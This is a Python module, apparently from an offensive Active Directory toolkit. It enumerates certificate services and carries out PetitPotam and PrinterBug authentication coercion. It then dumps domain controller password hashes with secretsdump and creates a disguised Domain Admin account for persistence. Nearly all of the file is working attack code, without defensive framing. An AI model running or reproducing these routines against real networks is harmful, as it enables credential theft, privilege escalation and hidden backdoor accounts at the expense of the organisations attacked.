"""
Implementation of Active Directory authentication coercion attacks.
Provides PetitPotam (MS-EFSR) and PrinterBug (MS-RPRN) coercion techniques
to force target machines to authenticate to a specified listener, enabling
potential relay attacks. Includes comprehensive ADCS vulnerability checking and exploitation.

Key Features:
- ADCS enumeration and vulnerability assessment
- Certificate template abuse (ESC1-ESC8)
- Post-exploitation capabilities (NTDS extraction, Domain Admin creation)
- Coercion attack techniques (PetitPotam, PrinterBug)
"""

from typing import Dict, Optional, Tuple, List
from .attack_base import AttackBase
import subprocess
import socket
import json
from impacket.dcerpc.v5 import transport, rprn, efsrpc
from impacket.dcerpc.v5.dtypes import NULL
import ldap3
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import ssl
import os
import datetime
import random
import string

class CoercionAttacks(AttackBase):
    def __init__(self):
        """
        Initialize the CoercionAttacks class.
        Sets up dictionaries to track ADCS information and post-exploitation results.
        """
        super().__init__()
        # Track information about Certificate Authorities, templates, and web endpoints
        self.adcs_info = {
            'cas': [],            # List of Certificate Authorities
            'templates': [],      # List of certificate templates
            'web_endpoints': [],  # List of ADCS web enrollment endpoints
            'vulnerabilities': {} # Dictionary of ESC vulnerabilities by type
        }
        # Track results of post-exploitation actions
        self.post_exploit_info = {
            'extracted_hashes': [], # List of hashes extracted from NTDS.dit
            'created_accounts': []  # List of Domain Admin accounts created
        }
        
    def enumerate_adcs(self, domain: str, dc_ip: str, username: str = None, password: str = None) -> bool:
        """
        Perform comprehensive enumeration of the ADCS environment.
        Uses both netexec and certipy for maximum coverage.
        
        The enumeration process:
        1. Basic ADCS discovery using netexec
        2. Template enumeration and vulnerability checks
        3. Web endpoint discovery
        4. Detailed template analysis with certipy
        
        Args:
            domain: Domain name to enumerate
            dc_ip: Domain Controller IP
            username: Optional username for authenticated enumeration
            password: Optional password for authenticated enumeration
        
        Returns:
            bool indicating if enumeration was successful
        """
        try:
            self.log_status("Starting ADCS enumeration...")
            
            # Use netexec for comprehensive ADCS enumeration
            try:
                # Basic ADCS enumeration
                cmd = ['netexec', 'ldap', dc_ip, '--adcs']
                if username and password:
                    cmd.extend(['-u', username, '-p', password])
                
                self.log_status("Running netexec ADCS enumeration...")
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if "Found ADCS" in result.stdout:
                    self.log_success("Netexec found ADCS information")
                    self._parse_netexec_output(result.stdout)
                    
                    # Additional ESC checks
                    cmd.extend(['--adcs-template', '--adcs-vuln'])
                    self.log_status("Checking for ESC vulnerabilities...")
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    self._parse_netexec_esc_output(result.stdout)
                    
                    # Check for ADCS web endpoints
                    cmd = ['netexec', 'http', dc_ip, '--adcs']
                    if username and password:
                        cmd.extend(['-u', username, '-p', password])
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    self._parse_netexec_web_output(result.stdout)
                    
            except Exception as e:
                self.log_error(f"Netexec enumeration failed: {str(e)}")
            
            # Use certipy for additional template details
            try:
                output_file = '/tmp/adcs_enum.json'
                cmd = ['certipy', 'find', '-u', username or 'anonymous', 
                      '-p', password or '', '-dc-ip', dc_ip, 
                      '-output', output_file, domain]
                
                self.log_status("Running certipy for additional template details...")
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        certipy_data = json.load(f)
                    self._parse_certipy_output(certipy_data)
                    os.remove(output_file)
                    self.log_success("Certipy enumeration completed")
            except Exception as e:
                self.log_error(f"Certipy enumeration failed: {str(e)}")
            
            if self.adcs_info:
                self._display_adcs_summary()
                return True
            return False
            
        except Exception as e:
            self.log_error(f"ADCS enumeration failed: {str(e)}")
            return False
            
    def _parse_netexec_output(self, output: str):
        """
        Parse the output from netexec ADCS enumeration.
        Extracts information about:
        - Enterprise CAs and their status
        - Certificate templates and their enabled/disabled state
        
        Args:
            output: Raw output string from netexec command
        """
        if not self.adcs_info:
            self.adcs_info = {
                'cas': [], 
                'templates': [], 
                'web_endpoints': [],
                'vulnerabilities': {
                    'esc1': [],
                    'esc2': [],
                    'esc3': [],
                    'esc4': [],
                    'esc5': [],
                    'esc6': [],
                    'esc7': [],
                    'esc8': []
                }
            }
            
        for line in output.splitlines():
            if "Enterprise CA:" in line:
                ca_name = line.split("Enterprise CA:")[1].strip()
                self.adcs_info['cas'].append({
                    'name': ca_name,
                    'source': 'netexec',
                    'status': 'Enabled' if 'enabled' in line.lower() else 'Unknown'
                })
            elif "Template:" in line:
                template = line.split("Template:")[1].strip()
                self.adcs_info['templates'].append({
                    'name': template,
                    'source': 'netexec',
                    'enabled': 'disabled' not in line.lower()
                })
                
    def _parse_netexec_esc_output(self, output: str):
        """
        Parse netexec output specifically looking for ESC vulnerabilities.
        Tracks vulnerabilities by template for each ESC type (1-8).
        
        Args:
            output: Raw output string from netexec ESC checks
        """
        current_template = None
        
        for line in output.splitlines():
            if "Template:" in line:
                current_template = line.split("Template:")[1].strip()
            elif current_template:
                for esc in range(1, 9):
                    if f"ESC{esc}" in line:
                        self.adcs_info['vulnerabilities'][f'esc{esc}'].append({
                            'template': current_template,
                            'details': line.strip()
                        })
                        
    def _parse_netexec_web_output(self, output: str):
        """
        Parse netexec output to find ADCS web enrollment endpoints.
        These endpoints are potential targets for NTLM relay attacks.
        
        Args:
            output: Raw output string from netexec web endpoint discovery
        """
        for line in output.splitlines():
            if "Web Enrollment:" in line:
                endpoint = line.split("Web Enrollment:")[1].strip()
                if endpoint not in self.adcs_info['web_endpoints']:
                    self.adcs_info['web_endpoints'].append(endpoint)
                    
    def _parse_certipy_output(self, data: dict):
        """
        Parse the detailed certificate template information from certipy.
        Provides deeper analysis of:
        - CA configuration and security settings
        - Template permissions and enrollment rights
        - Extended template properties
        
        Args:
            data: JSON data from certipy find command
        """
        if not self.adcs_info:
            self.adcs_info = {'cas': [], 'templates': [], 'web_endpoints': []}
            
        if 'Certificate Authorities' in data:
            for ca in data['Certificate Authorities'].values():
                self.adcs_info['cas'].append({
                    'name': ca.get('Name'),
                    'dns': ca.get('DNS'),
                    'web_enrollment': ca.get('Web Enrollment'),
                    'source': 'certipy'
                })
                
        if 'Certificate Templates' in data:
            for template in data['Certificate Templates'].values():
                self.adcs_info['templates'].append({
                    'name': template.get('Name'),
                    'schema_version': template.get('Schema Version'),
                    'vuln_flags': template.get('Vulnerable Flags', []),
                    'source': 'certipy'
                })
                
    def _display_adcs_summary(self):
        """
        Display a comprehensive summary of all ADCS findings including:
        - Certificate Authorities and their status
        - Vulnerable templates and their ESC categories
        - Web enrollment endpoints
        - Post-exploitation results (if any)
        """
        print("\n=== ADCS Environment Summary ===")
        
        print("\nCertificate Authorities:")
        for ca in self.adcs_info['cas']:
            print(f"• {ca['name']}")
            if ca.get('dns'):
                print(f"  - DNS: {ca['dns']}")
            if ca.get('web_enrollment'):
                print(f"  - Web Enrollment: {ca['web_enrollment']}")
                
        print("\nVulnerable Templates:")
        for esc_type, vulns in self.adcs_info['vulnerabilities'].items():
            print(f"\nESC{esc_type} Vulnerabilities:")
            for vuln in vulns:
                print(f"• Template: {vuln['template']}")
                print(f"  - {vuln['description']}")
                
        print("\nWeb Endpoints:")
        for endpoint in self.adcs_info['web_endpoints']:
            print(f"• {endpoint}")
            
        # Add post-exploitation results if available
        if self.post_exploit_info['extracted_hashes']:
            print("\nExtracted NTDS Hashes:")
            print(f"• Total hashes: {len(self.post_exploit_info['extracted_hashes'])}")
            print("• Sample accounts:")
            for hash_info in self.post_exploit_info['extracted_hashes'][:3]:
                print(f"  - {hash_info['username']} (RID: {hash_info['rid']})")
                
        if self.post_exploit_info['created_accounts']:
            print("\nCreated Domain Admin Accounts:")
            for account in self.post_exploit_info['created_accounts']:
                print(f"• Username: {account['username']}")
                print(f"  - Domain: {account['domain']}")
                print(f"  - Created: {account['timestamp']}")

    def check_adcs_vulnerabilities(self, domain: str, dc_ip: str) -> Tuple[bool, List[str]]:
        """
        Check for vulnerable ADCS certificate templates using netexec
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
        
        Returns:
            Tuple of (is_vulnerable, list of vulnerable template names)
        """
        # First enumerate ADCS if we haven't already
        if not self.adcs_info:
            self.enumerate_adcs(domain, dc_ip)
            
        # Check if we found any ESC vulnerabilities
        vulnerable_templates = set()
        for vulns in self.adcs_info['vulnerabilities'].values():
            vulnerable_templates.update(v['template'] for v in vulns)
            
        if vulnerable_templates:
            self.log_success(
                f"Found {len(vulnerable_templates)} vulnerable certificate templates\n"
                "Note: These templates have ESC vulnerabilities that could be exploited"
            )
            return True, list(vulnerable_templates)
        
        self.log_status("No vulnerable certificate templates found")
        return False, []
            
    def check_adcs_enabled(self, dc_ip: str) -> bool:
        """
        Check if ADCS is enabled on the domain
        
        Args:
            dc_ip: Domain Controller IP
        
        Returns:
            bool indicating if ADCS is enabled
        """
        try:
            # Try to connect to ADCS web enrollment
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((dc_ip, 443))
            sock.close()
            
            if result == 0:
                # Check for ADCS specific endpoints
                try:
                    cert = ssl.get_server_certificate((dc_ip, 443))
                    x509_cert = x509.load_pem_x509_certificate(
                        cert.encode(),
                        default_backend()
                    )
                    
                    # Check if certificate is from ADCS
                    if 'Active Directory Certificate Services' in str(x509_cert.subject):
                        self.log_success("ADCS is enabled and running")
                        return True
                except:
                    pass
                    
            self.log_status("ADCS does not appear to be enabled")
            return False
            
        except Exception as e:
            self.log_error(f"Error checking ADCS status: {str(e)}")
            return False

    def petitpotam(self, target_ip: str, listener_ip: str, listener_port: int = 445) -> bool:
        """
        Execute PetitPotam coercion attack
        
        Args:
            target_ip: Target machine IP
            listener_ip: IP where listener is running
            listener_port: Port where listener is running
        
        Returns:
            bool indicating success/failure
        """
        # First check ADCS status
        dc_ip = self.db.get_dc_ip()
        domain = self.db.get_domain_name()
        
        if not all([dc_ip, domain]):
            self.log_error("Missing domain information. Run network scanning first.")
            return False
            
        if not self.check_adcs_enabled(dc_ip):
            self.log_error("ADCS is not enabled. PetitPotam may not be effective.")
            return False
            
        is_vulnerable, templates = self.check_adcs_vulnerabilities(domain, dc_ip)
        if not is_vulnerable:
            self.log_error("No vulnerable ADCS templates found. PetitPotam may not be effective.")
            return False
            
        try:
            self.log_status(f"Attempting PetitPotam against {target_ip}")
            
            # Setup DCERPC connection
            rpctransport = transport.DCERPCTransportFactory(f'ncacn_np:{target_ip}[\\pipe\\lsarpc]')
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            
            # Bind to MS-EFSR
            dce.bind(efsrpc.MSRPC_UUID_EFSR)
            
            # Prepare connection string
            connection_string = f"\\\\{listener_ip}\\share"
            
            # Call EfsRpcOpenFileRaw to trigger authentication
            try:
                efsrpc.EfsRpcOpenFileRaw(dce, connection_string)
            except Exception:
                # Expected to fail, we only need the auth attempt
                pass
                
            self.log_success(f"PetitPotam coercion successful against {target_ip}")
            return True
            
        except Exception as e:
            self.log_error(f"PetitPotam failed: {str(e)}")
            return False
            
    def printerbug(self, target_ip: str, listener_ip: str, listener_port: int = 445) -> bool:
        """
        Execute PrinterBug coercion attack
        
        Args:
            target_ip: Target machine IP
            listener_ip: IP where listener is running
            listener_port: Port where listener is running
        
        Returns:
            bool indicating success/failure
        """
        # First check ADCS status
        dc_ip = self.db.get_dc_ip()
        domain = self.db.get_domain_name()
        
        if not all([dc_ip, domain]):
            self.log_error("Missing domain information. Run network scanning first.")
            return False
            
        if not self.check_adcs_enabled(dc_ip):
            self.log_error("ADCS is not enabled. PrinterBug may not be effective.")
            return False
            
        is_vulnerable, templates = self.check_adcs_vulnerabilities(domain, dc_ip)
        if not is_vulnerable:
            self.log_error("No vulnerable ADCS templates found. PrinterBug may not be effective.")
            return False
            
        try:
            self.log_status(f"Attempting PrinterBug against {target_ip}")
            
            # Setup DCERPC connection
            rpctransport = transport.DCERPCTransportFactory(f'ncacn_np:{target_ip}[\\pipe\\spoolss]')
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            
            # Bind to MS-RPRN
            dce.bind(rprn.MSRPC_UUID_RPRN)
            
            # Prepare connection string
            connection_string = f"\\\\{listener_ip}"
            
            # Call RpcRemoteFindFirstPrinterChangeNotification to trigger authentication
            try:
                rprn.hRpcOpenPrinter(dce, f"\\\\{target_ip}\x00")
                rprn.hRpcRemoteFindFirstPrinterChangeNotification(dce, connection_string)
            except Exception:
                # Expected to fail, we only need the auth attempt
                pass
                
            self.log_success(f"PrinterBug coercion successful against {target_ip}")
            return True
            
        except Exception as e:
            self.log_error(f"PrinterBug failed: {str(e)}")
            return False 

    def post_exploit_ntds(self, domain: str, dc_ip: str, username: str, password: str = None, 
                         cert_path: str = None) -> bool:
        """
        Extract NTDS.dit using certificate authentication or provided credentials
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            username: Username with Domain Admin rights
            password: Optional password (if not using certificate)
            cert_path: Path to certificate file (if using certificate auth)
            
        Returns:
            bool indicating success/failure
        """
        try:
            self.log_status(f"Attempting NTDS.dit extraction from {dc_ip}...")
            
            # Create output directory
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = f"loot/ntds_{timestamp}"
            os.makedirs(output_dir, exist_ok=True)
            
            if cert_path:
                # Use certificate for authentication
                cmd = [
                    'secretsdump.py',
                    '-cert-pfx', cert_path,
                    '-just-dc-ntlm',
                    '-outputfile', f'{output_dir}/ntds',
                    f'{domain}/{username}@{dc_ip}'
                ]
            else:
                # Use password authentication
                cmd = [
                    'secretsdump.py',
                    '-just-dc-ntlm',
                    '-outputfile', f'{output_dir}/ntds',
                    f'{domain}/{username}:{password}@{dc_ip}'
                ]
            
            self.log_status("Running secretsdump.py...")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if os.path.exists(f"{output_dir}/ntds.ntds"):
                self.log_success(f"Successfully extracted NTDS hashes to {output_dir}/ntds.ntds")
                
                # Parse and store hashes
                with open(f"{output_dir}/ntds.ntds", 'r') as f:
                    for line in f:
                        if ':' in line:
                            username, rid, lm, nt = line.strip().split(':')
                            self.post_exploit_info['extracted_hashes'].append({
                                'username': username,
                                'rid': rid,
                                'nt_hash': nt,
                                'source': 'NTDS.dit',
                                'timestamp': timestamp
                            })
                
                return True
            
            self.log_error("Failed to extract NTDS hashes")
            return False
            
        except Exception as e:
            self.log_error(f"NTDS extraction failed: {str(e)}")
            return False

    def create_domain_admin(self, domain: str, dc_ip: str, username: str, password: str = None,
                          cert_path: str = None, new_admin: str = None, new_pass: str = None) -> bool:
        """
        Create a new Domain Admin account using certificate or credentials
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            username: Username with Domain Admin rights
            password: Optional password (if not using certificate)
            cert_path: Path to certificate file (if using certificate auth)
            new_admin: Optional username for new admin (random if not provided)
            new_pass: Optional password for new admin (random if not provided)
            
        Returns:
            bool indicating success/failure
        """
        try:
            # Generate random username/password if not provided
            if not new_admin:
                new_admin = 'svc_' + ''.join(random.choices(string.ascii_lowercase, k=8))
            if not new_pass:
                new_pass = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=16))
            
            self.log_status(f"Attempting to create new Domain Admin: {new_admin}")
            
            # First create the user
            if cert_path:
                cmd = [
                    'adduser.py',
                    '-cert-pfx', cert_path,
                    '-computer-name', dc_ip,
                    '-domain', domain,
                    '-user-name', new_admin,
                    '-user-pass', new_pass
                ]
            else:
                cmd = [
                    'adduser.py',
                    f'{domain}/{username}:{password}@{dc_ip}',
                    '-user-name', new_admin,
                    '-user-pass', new_pass
                ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Successfully created user" not in result.stdout:
                self.log_error("Failed to create user account")
                return False
            
            # Add to Domain Admins group
            if cert_path:
                cmd = [
                    'net.py',
                    '-cert-pfx', cert_path,
                    f'{domain}/{username}@{dc_ip}',
                    'group',
                    'add',
                    '"Domain Admins"',
                    new_admin
                ]
            else:
                cmd = [
                    'net.py',
                    f'{domain}/{username}:{password}@{dc_ip}',
                    'group',
                    'add',
                    '"Domain Admins"',
                    new_admin
                ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Successfully added user" in result.stdout:
                self.log_success(f"Successfully created Domain Admin account:")
                self.log_success(f"Username: {new_admin}")
                self.log_success(f"Password: {new_pass}")
                
                # Store created account info
                self.post_exploit_info['created_accounts'].append({
                    'username': new_admin,
                    'password': new_pass,
                    'domain': domain,
                    'groups': ['Domain Admins'],
                    'timestamp': datetime.datetime.now().isoformat()
                })
                
                return True
            
            self.log_error("Failed to add user to Domain Admins group")
            return False
            
        except Exception as e:
            self.log_error(f"Domain Admin creation failed: {str(e)}")
            return False